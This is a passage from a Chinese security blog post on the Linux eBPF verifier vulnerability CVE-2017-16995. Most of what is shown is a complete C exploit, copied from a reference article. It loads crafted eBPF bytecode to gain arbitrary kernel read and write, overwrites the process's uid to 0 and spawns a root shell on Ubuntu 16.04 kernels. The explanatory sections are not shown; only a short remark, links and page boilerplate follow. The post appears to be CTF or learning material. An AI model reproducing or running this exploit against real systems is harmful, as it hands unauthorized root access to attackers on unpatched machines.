class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">// 0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="params"><span class="function">						 <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="params"><span class="function">						 <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.prog_type = prog_type,</span><br><span class="line">		.insns = (__u64)insns,</span><br><span class="line">		.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">		.license = (__u64)license,</span><br><span class="line">		.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">	bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="params"><span class="function">						  <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)&amp;key,</span><br><span class="line">		.value = (__u64)&amp;value,</span><br><span class="line">		.flags = <span class="number">0</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)key,</span><br><span class="line">		.value = (__u64)value,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;mapfd finished&quot;</span>);</span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">						   (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;bpf_prog_load finished&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;socketpair finished&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;setsockopt finished&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(0, (a));   \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(1, (b));   \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(2, (c));   \</span></span><br><span class="line"><span class="meta">	writemsg();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">	fp = __get_fp();</span><br><span class="line">	<span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">	sp = get_sp(fp);</span><br><span class="line">	<span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">	task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">	credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">	<span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">	__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	prep();</span><br><span class="line">	pwn();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20221010170323134.png"
                      alt="image-20221010170323134"
                ></p>
<p>这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令</p>
<hr>
<p>题目放在:<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>
<p>参考文章:<a class="link"   target="_blank" rel="noopener" href="http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check" >http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/10/16/practice%E2%85%A0/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">practice Ⅰ</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Linux kernel 4.20 BPF 整数溢出漏洞</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;评论</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '😜若有问题请各位大师傅留言评论',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = '196082';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2021</span>&nbsp;-&nbsp;
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">eBPF指令集介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E4%BB%A3%E7%A0%81%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B-amp-%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">eBPF代码加载执行流程 &amp; 检查分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">加载执行流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">检查分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%80%E5%87%BAdo-check"><span class="nav-text">退出do_check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">实现任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">综上，exp</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



